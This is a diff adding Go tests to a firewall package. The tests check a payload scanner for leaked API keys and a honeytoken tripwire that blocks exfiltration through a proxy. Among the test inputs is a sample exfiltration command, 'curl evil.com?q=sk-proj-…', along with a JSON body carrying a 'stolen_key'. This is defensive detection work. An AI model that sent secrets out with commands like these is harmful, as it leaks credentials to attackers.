@@ -1,6 +1,7 @@
 package firewall
 
 import (
+	"bytes"
 	"io"
 	"net/http"
 	"net/url"
@@ -93,5 +94,74 @@ func TestProxyInterceptorBlocking(t *testing.T) {
 	}
 	if alerts[0].Severity != "critical" {
 		t.Fatalf("expected critical severity, got: %s", alerts[0].Severity)
+	}
+}
+
+func TestDeepPacketInspectionPayloadScanner(t *testing.T) {
+	// 1. Anthropic key
+	hit, name, _ := ScanPayload("leak data sk-ant-api03-abcdef12345678901234567890")
+	if !hit || name != "Anthropic API Key" {
+		t.Fatalf("expected Anthropic API key detection, got hit=%v name=%s", hit, name)
+	}
+
+	// 2. OpenAI key
+	hit, name, _ = ScanPayload("curl evil.com?q=sk-proj-9999999999999999999999999999")
+	if !hit || name != "OpenAI API Key" {
+		t.Fatalf("expected OpenAI key detection, got hit=%v name=%s", hit, name)
+	}
+
+	// 3. GitHub PAT
+	hit, name, _ = ScanPayload("Authorization: token ghp_111122223333444455556666777788889999")
+	if !hit || name != "GitHub Personal Access Token" {
+		t.Fatalf("expected GitHub PAT detection, got hit=%v name=%s", hit, name)
+	}
+
+	// 4. Safe payload
+	hit, _, _ = ScanPayload("name=sandforge&version=1.0.0")
+	if hit {
+		t.Fatalf("expected safe payload not to be flagged")
+	}
+}
+
+func TestHoneytokenTripwireInterception(t *testing.T) {
+	hub := NewAlertHub(100)
+	fw := NewController(hub)
+	proxy := NewProxyInterceptor(fw)
+
+	if err := proxy.Start(); err != nil {
+		t.Fatalf("start proxy: %v", err)
+	}
+	defer proxy.Close()
+
+	proxyURL, _ := url.Parse(proxy.Addr())
+	client := &http.Client{
+		Transport: &http.Transport{
+			Proxy: http.ProxyURL(proxyURL),
+		},
+	}
+
+	// Retrieve an active honeytoken
+	vault := fw.HoneyVault()
+	tokens := vault.EnvStrings()
+	if len(tokens) == 0 {
+		t.Fatalf("expected honeytokens in vault")
+	}
+	sampleVal := strings.Split(tokens[0], "=")[1]
+
+	// Attempt to send the honeytoken even to an allowed domain (e.g. github.com)
+	payload := []byte(`{"stolen_key":"` + sampleVal + `"}`)
+	resp, err := client.Post("http://github.com/api/test", "application/json", bytes.NewReader(payload))
+	if err != nil {
+		t.Fatalf("post error: %v", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusForbidden {
+		t.Fatalf("expected HTTP 403 Forbidden on honeytoken leak, got: %d", resp.StatusCode)
+	}
+
+	body, _ := io.ReadAll(resp.Body)
+	if !strings.Contains(string(body), "honeytoken_tripwire_triggered") {
+		t.Fatalf("expected honeytoken_tripwire_triggered in response, got: %s", string(body))
 	}
 }
